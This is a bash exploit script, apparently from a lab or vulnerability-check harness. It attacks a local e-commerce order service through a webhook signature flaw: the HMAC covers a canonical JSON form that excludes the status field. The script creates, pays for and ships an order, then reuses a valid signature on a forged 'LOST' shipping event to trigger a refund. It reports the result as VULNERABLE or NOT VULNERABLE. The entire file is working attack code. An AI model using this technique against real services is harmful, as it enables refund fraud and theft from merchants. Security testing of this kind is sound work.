#!/bin/bash
#
# attack.sh — webhook signature bypass via JSON canonicalization flaw
#
# Usage: ./attack.sh [base_url] [webhook_secret]
#

set -euo pipefail

BASE_URL="${1:-http://localhost:8080}"
WEBHOOK_SECRET="${2:-super-secret-webhook-key-2024}"
MAX_RETRIES=5

echo ""
echo "=== Webhook Signature Bypass Attack ==="
echo "Target: $BASE_URL"
echo "Secret: $WEBHOOK_SECRET (from docker-compose.yml)"
echo ""

if ! curl -sf "$BASE_URL/health" > /dev/null 2>&1; then
    echo "ERROR: service not reachable at $BASE_URL"
    exit 1
fi

# step 1: create order
RESP=$(curl -s -X POST "$BASE_URL/orders" \
    -H "Content-Type: application/json" \
    -d '{"customer_id":"victim_user","items":[{"product_id":"laptop-01","quantity":1,"price":1299.99}]}')

ORDER_ID=$(echo "$RESP" | jq -r '.order_id // empty')
if [ -z "$ORDER_ID" ]; then
    echo "ERROR: could not create order"
    exit 1
fi
TOTAL=$(echo "$RESP" | jq -r '.total')
echo "1. Created order $ORDER_ID (total=\$$TOTAL)"

# step 2: pay
for attempt in $(seq 1 $MAX_RETRIES); do
    PAY_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$BASE_URL/orders/$ORDER_ID/pay" \
        -H "Content-Type: application/json" \
        -d '{"payment_id":"pay_001"}')
    [ "$PAY_CODE" = "200" ] && break
    sleep 2
done
if [ "$PAY_CODE" != "200" ]; then
    echo "ERROR: could not pay (HTTP $PAY_CODE)"
    exit 1
fi
echo "2. Paid order (PENDING_PAYMENT -> PAID)"

# step 3: ship
for attempt in $(seq 1 $MAX_RETRIES); do
    SHIP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$BASE_URL/orders/$ORDER_ID/ship")
    [ "$SHIP_CODE" = "200" ] && break
    sleep 2
done
if [ "$SHIP_CODE" != "200" ]; then
    echo "ERROR: could not ship (HTTP $SHIP_CODE)"
    exit 1
fi
echo "3. Shipped order (PAID -> SHIPPING)"

# step 4: compute signature over canonical form (excludes status)
TIMESTAMP=$(date +%s)
SHIPMENT_ID="SH-$(echo $ORDER_ID | cut -c1-8)"

CANONICAL="{\"shipment_id\":\"${SHIPMENT_ID}\",\"order_id\":\"${ORDER_ID}\",\"event_type\":\"status_update\",\"timestamp\":${TIMESTAMP}}"
SIGNATURE=$(printf '%s' "$CANONICAL" | openssl dgst -sha256 -hmac "$WEBHOOK_SECRET" 2>/dev/null | awk '{print $NF}')

echo "4. Computed HMAC over canonical form (without status field)"
echo "   canonical: $CANONICAL"
echo "   signature: $SIGNATURE"

# step 5: send legitimate webhook (IN_TRANSIT)
LEGIT_PAYLOAD="{\"shipment_id\":\"${SHIPMENT_ID}\",\"order_id\":\"${ORDER_ID}\",\"event_type\":\"status_update\",\"status\":\"IN_TRANSIT\",\"timestamp\":${TIMESTAMP}}"

LEGIT_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$BASE_URL/webhooks/shipping" \
    -H "Content-Type: application/json" \
    -H "X-Webhook-Signature: $SIGNATURE" \
    -d "$LEGIT_PAYLOAD")

echo "5. Sent webhook status=IN_TRANSIT  -> HTTP $LEGIT_CODE"

if [ "$LEGIT_CODE" != "200" ]; then
    echo "ERROR: legitimate webhook rejected (HTTP $LEGIT_CODE)"
    exit 1
fi

# step 6: send ATTACK webhook (LOST) with SAME signature
ATTACK_PAYLOAD="{\"shipment_id\":\"${SHIPMENT_ID}\",\"order_id\":\"${ORDER_ID}\",\"event_type\":\"status_update\",\"status\":\"LOST\",\"timestamp\":${TIMESTAMP}}"

ATTACK_RESP=$(curl -s -w "\n%{http_code}" -X POST "$BASE_URL/webhooks/shipping" \
    -H "Content-Type: application/json" \
    -H "X-Webhook-Signature: $SIGNATURE" \
    -d "$ATTACK_PAYLOAD")
ATTACK_CODE=$(echo "$ATTACK_RESP" | tail -1)
ATTACK_BODY=$(echo "$ATTACK_RESP" | sed '$d')

REFUND=$(echo "$ATTACK_BODY" | jq -r '.refund_triggered // empty')

echo "6. Sent webhook status=LOST       -> HTTP $ATTACK_CODE (same signature!)"

# step 7: check final state
FINAL_STATUS=$(curl -s "$BASE_URL/orders/$ORDER_ID" | jq -r '.status')
FINAL_REASON=$(curl -s "$BASE_URL/orders/$ORDER_ID" | jq -r '.reason')

echo ""
echo "--- Results ---"
echo "  Order:    $ORDER_ID"
echo "  Status:   $FINAL_STATUS"
echo "  Reason:   $FINAL_REASON"
echo "  Refund:   $REFUND"
echo ""

if [ "$FINAL_STATUS" = "SHIP_FAILED" ] && [ "$REFUND" = "true" ]; then
    echo "VULNERABLE: signature bypass succeeded, refund triggered (\$$TOTAL)."
else
    echo "NOT VULNERABLE: attack was blocked."
fi
echo ""